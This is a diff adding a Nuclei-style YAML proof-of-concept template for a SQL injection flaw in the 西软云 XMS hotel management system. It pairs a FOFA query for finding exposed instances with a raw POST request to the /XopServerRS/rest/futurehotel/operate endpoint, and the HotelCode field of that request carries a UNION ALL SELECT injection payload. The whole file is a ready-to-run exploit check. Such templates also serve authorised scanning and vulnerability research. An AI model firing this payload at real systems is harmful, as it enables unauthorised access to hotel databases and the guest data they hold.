@@ -1,0 +1,19 @@
+id: poc-lvfwlr9x90d1dd2l
+info:
+  name: 西软云operate存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lvfwlr9x90d1dd2l'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lvfwlr9x90d1dd2l
+    fofa: body="WebXMS" || body="西软云XMS"
+http:
+- raw:
+  - "POST /XopServerRS/rest/futurehotel/operate HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<UpdateRQ>\n  <AuthenticationToken>\n    <Token>test-token</Token>\n  </AuthenticationToken>\n  <TaoBaoOrderId>0</TaoBaoOrderId>\n  <OrderId>ORD123</OrderId>\n  <RequestID>REQ-123</RequestID>\n  <HotelCode>H002' UNION ALL SELECT CONCAT(CONCAT('qbbjq','HwNO'),'qpzxq'),NULL-- PoVf</HotelCode>\n  <OperateType>9</OperateType>\n  <Action>0</Action>\n  <DisplayText>Cancel invoice request</DisplayText>\n  <Extensions/>\n</UpdateRQ>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
